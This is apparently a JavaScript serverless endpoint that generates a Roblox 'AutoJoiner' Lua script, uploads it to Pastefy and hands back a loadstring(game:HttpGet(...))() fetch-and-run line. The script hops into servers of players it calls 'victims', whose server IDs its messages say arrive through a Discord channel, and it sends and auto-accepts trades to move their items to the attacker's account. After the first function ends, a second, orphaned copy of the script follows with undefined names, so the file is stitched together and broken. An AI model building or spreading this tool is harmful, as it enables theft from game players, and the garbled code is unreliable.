export default async function handler(req, res) {
    // Enable CORS for all origins
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { webhook, gameId, receiverName, interval } = req.body;
    
    if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid Discord webhook' });
    }
    
    if (!receiverName) {
        return res.status(400).json({ error: 'Receiver username required' });
    }
    
    try {
        // Generate the script
        const script = generateScript(webhook, gameId, receiverName, interval);
        
        // Upload to Pastefy
        const pastefyRes = await fetch('https://pastefy.app/api/v2/paste', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: script,
                title: `AutoJoiner_${Date.now()}`,
                visibility: 'UNLISTED'
            })
        });
        
        if (!pastefyRes.ok) {
            throw new Error('Pastefy upload failed');
        }
        
        const pasteData = await pastefyRes.json();
        const pasteId = pasteData.id || pasteData.paste?.id;
        const rawUrl = `https://pastefy.app/${pasteId}/raw`;
        
        return res.status(200).json({
            success: true,
            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`
        });
        
    } catch (error) {
        // If Pastefy fails, return script directly
        const script = generateScript(webhook, gameId, receiverName, interval);
        return res.status(200).json({
            success: true,
            loadstring: `-- Copy this script directly:\n\n${script}`
        });
    }
}

function generateScript(webhook, gameId, receiverName, interval) {
    return `-- AUTO-JOINER SCRIPT
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local lp = Players.LocalPlayer

local WEBHOOK = "${webhook}"
local TARGET_GAME = ${gameId}
local RECEIVER = "${receiverName}"
local CHECK_INTERVAL = ${interval}

local requestFunc = syn and syn.request or request or (http and http.request)

print("[AutoJoiner] Started! Target: " .. RECEIVER)

-- Trade function
local function sendTrade()
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then return false end
    
    local SendRequest = Trade:FindFirstChild("SendRequest")
    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
    
    if not SendRequest then return false end
    
    pcall(function() SendRequest:InvokeServer(RECEIVER) end)
    task.wait(2)
    pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, {}) end)
    
    return true
end

-- Main loop
while true do
    if game.PlaceId == TARGET_GAME then
        print("[AutoJoiner] In game, trading...")
        sendTrade()
        task.wait(5)
        TeleportService:Teleport(TARGET_GAME)
        task.wait(5)
    else
        print("[AutoJoiner] Waiting for victim. Set TARGET_JOB_ID variable")
        print("[AutoJoiner] Copy Job ID from Discord and set: local TARGET_JOB_ID = 'job_id_here'")
    end
    task.wait(CHECK_INTERVAL)
end`;
}        return false
    end
    
    -- Get trade remotes
    local SendRequest = Trade:FindFirstChild("SendRequest")
    local GetStatus = Trade:FindFirstChild("GetTradeStatus")
    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
    local OfferItem = Trade:FindFirstChild("OfferItem")
    local UpdateTrade = Trade:FindFirstChild("UpdateTrade")
    
    if not SendRequest or not GetStatus then
        warn("[AutoJoiner] Trade remotes not found")
        return false
    end
    
    -- Send trade request
    local success, err = pcall(function()
        return SendRequest:InvokeServer(receiver)
    end)
    
    if not success then
        print("[AutoJoiner] Failed to send request: " .. tostring(err))
        return false
    end
    
    print("[AutoJoiner] Trade request sent to " .. receiver)
    
    -- Wait for trade to start
    local timeout = 0
    local tradeStarted = false
    
    while timeout < 15 and not tradeStarted do
        local status = pcall(GetStatus.InvokeServer, GetStatus)
        if status then
            tradeStarted = true
            break
        end
        task.wait(0.5)
        timeout = timeout + 0.5
    end
    
    if not tradeStarted then
        print("[AutoJoiner] Trade didn't start")
        return false
    end
    
    print("[AutoJoiner] Trade started! Waiting for items...")
    
    -- Wait for items to be added
    task.wait(3)
    
    -- Get current offer from UpdateTrade event
    local lastOffer = nil
    if UpdateTrade then
        local connection
        connection = UpdateTrade.OnClientEvent:Connect(function(data)
            if data and data.LastOffer then
                lastOffer = data.LastOffer
            end
        end)
        task.wait(2)
        connection:Disconnect()
    end
    
    -- Accept the trade
    if AcceptTrade then
        pcall(function()
            AcceptTrade:FireServer(game.PlaceId * 3, lastOffer or {})
            print("[AutoJoiner] Trade accepted!")
        end)
    end
    
    -- Wait for trade to complete
    task.wait(5)
    
    return true
end

-- ========== GET LATEST VICTIM FROM DISCORD ==========
local function getLatestVictim()
    -- Since Discord webhooks don't have a "read" API, we need to use a middleman
    -- Option 1: Use a free API service like Pastebin to store the latest Job ID
    -- Option 2: Use a Discord bot to read messages
    -- Option 3: Manual input (you copy the Job ID from Discord)
    
    -- For automatic detection, you need to set up a simple API endpoint
    -- For now, this script expects you to manually set the target
    
    -- AUTO-DETECTION METHOD (requires a free API):
    -- Create a free account on https://pipedream.com or https://make.com
    -- Set up a webhook that captures Discord messages and stores the Job ID
    -- Then this script can read from that API
    
    print("[AutoJoiner] Waiting for victim from Discord...")
    print("[AutoJoiner] Victims will appear in your Discord channel")
    print("[AutoJoiner] Copy the Job ID from the message and manually set it, OR set up auto-detection")
    
    return nil
end

-- ========== MONITOR FOR VICTIMS ==========
local function monitorForVictims()
    print("[AutoJoiner] ========================================")
    print("[AutoJoiner] Auto-Joiner Started!")
    print("[AutoJoiner] Receiver: " .. RECEIVER_NAME)
    print("[AutoJoiner] Target Game: " .. TARGET_GAME)
    print("[AutoJoiner] Check interval: " .. CHECK_INTERVAL .. " seconds")
    print("[AutoJoiner] ========================================")
    
    -- Variable to store target Job ID (you can manually set this)
    -- Example: local targetJobId = "00000000-0000-0000-0000-000000000000"
    local targetJobId = nil
    
    print("[AutoJoiner] To set a target manually, edit the 'targetJobId' variable above")
    print("[AutoJoiner] Or set up auto-detection using Pastebin or a Discord bot")
    
    while true do
        -- Check if we're in the target game
        if game.PlaceId == TARGET_GAME then
            print("[AutoJoiner] Currently in target game!")
            
            -- Look for the receiver
            local receiver = Players:FindFirstChild(RECEIVER_NAME)
            if receiver then
                print("[AutoJoiner] Found receiver! Sending trade...")
                acceptTrade(RECEIVER_NAME)
                task.wait(5)
            end
            
            -- Leave and go back to lobby to find more
            print("[AutoJoiner] Leaving server to find more victims...")
            task.wait(3)
            pcall(function()
                TeleportService:Teleport(TARGET_GAME)
            end)
            task.wait(5)
        else
            -- Check if we have a target
            if targetJobId and targetJobId ~= "" and targetJobId ~= lastJoinedId then
                print("[AutoJoiner] Found victim server: " .. targetJobId)
                print("[AutoJoiner] Joining...")
                
                local success, err = pcall(function()
                    TeleportService:TeleportToPlaceInstance(TARGET_GAME, targetJobId, lp)
                end)
                
                if success then
                    print("[AutoJoiner] Teleporting to victim server...")
                    lastJoinedId = targetJobId
                    targetJobId = nil
                    break
                else
                    print("[AutoJoiner] Failed to join: " .. tostring(err))
                    targetJobId = nil
                end
            else
                print("[AutoJoiner] No target server. Waiting for victim...")
                print("[AutoJoiner] Victims will appear in your Discord channel")
            end
        end
        
        task.wait(CHECK_INTERVAL)
    end
end

-- Start monitoring
local success, err = pcall(monitorForVictims)
if not success then
    warn("[AutoJoiner] Error: " .. tostring(err))
end

-- If script ends, restart
if game.PlaceId == TARGET_GAME then
    print("[AutoJoiner] Trade complete! Looping to find more...")
    task.wait(10)
    TeleportService:Teleport(TARGET_GAME)
else
    print("[AutoJoiner] Script ended. Restart to continue.")
end
`;
}
